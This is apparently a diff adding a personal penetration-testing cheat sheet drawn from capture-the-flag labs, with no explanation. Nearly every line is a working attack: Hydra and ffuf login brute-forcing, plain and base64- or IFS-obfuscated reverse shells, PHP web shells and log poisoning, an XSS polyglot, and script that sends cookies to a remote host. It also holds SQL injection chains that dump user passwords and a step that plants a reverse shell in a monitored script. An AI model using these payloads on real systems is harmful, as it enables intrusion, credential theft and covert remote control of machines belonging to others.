@@ -1,0 +1,117 @@
+# usefullness
+
+
+
+hydra -l <username> -P <wordlist> 10.10.119.31 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+hydra -t 16 -l molly -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/:username=^molly^&password=^PASS^:F=incorrect" -VV
+curl http://10.10.161.169/customers/reset?email=robert@acmeitsupport.thm -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=i0h1m@customer.acmeitsupport.thm"
+
+ncat 10.0.0.1 4242 ${IFS}-e${IFS}/bin/bash
+bash -i >& /dev/tcp/10.10.14.118/4400 0>&1
+
+bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.14.172/4400${IFS}0>&1
+
+;echo${IFS%??}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC4xMTAuMzAvNDQwMCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzIvNDQwMCAwPiYx  "${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+base64 -w 0
+
+ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt  -X POST -d "username=FUZZ&email=ha%40hf.com&password=jsum9999&cpassword=jsum9999" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.161.169/customers/signup -mr "An account with this username already exists"
+
+
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.124 9995 >/tmp/f
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+ctrl + z
+fstty raw -echo; fg
+
+ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt  -X POST -d "log=bjoel&pwd=FUZZ&wp-submit=Log+In:F=" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.41.159/wp-login.php -mr "The password"
+
+ffuf -w vname.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=W1&password=W2" -u http://10.10.161.169/customers/login -fc 200
+
+<?php echo shell_exec('ls -lart'); ?>
+<?php $output = shell_exec('hostname'); echo "<pre>$output</pre>"; ?>
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.172/4400 0>&1'"); ?>
+
+
+<?php system(id); ?>
+
+User-Agent:
+
+
+curl -H "User-Agent: <?php system(\$_GET['c']); ?>"  http://10.10.102.205
+php://filter/convert.base64-encode/resource=index
+
+XSS polyglot
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+onload="alert('THM');
+       </textarea><script>fetch("http://10.8.110.30:1234?cookie" + btoa(document.cookie))</script>
+       </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+       
+ /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
+/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
+0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
+
+
+1 UNION SELECT 1
+1 UNION SELECT 1,2
+1 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,3
+0 UNION SELECT 1,2,database()
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+' OR 1=1;--
+
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+admin123' UNION SELECT 1,2,3 from analytics_referrers where domain like 'a%
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+
+
+
+
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+admin123' UNION SELECT 1,2,3 from users where username like 'a%
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+
+find / -perm -u=s -type f 2>/dev/null
+sudo -i -u user2
+
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0NDQgMD4mMQo=" | base64 -d | bash
+sh${IFS%??}-i${IFS%??}>&${IFS%??}/dev/tcp/10.10.14.6/4444${IFS%??}0>&1
+bash -i >& /dev/tcp/10.10.14.6/4444 0>&1
+ | tee -a
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.124 4444 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.124 9995 >/tmp/f
+
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.122 4488 >/tmp/f' | tee -a monitor.sh
+
+bash -i >& /dev/tcp/188.52.184.57/4444 0>&1
+
+
+script /dev/null -c bash
+
+10.10.14.6/23
+
+{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= |
+base64 -d | bash;"}'
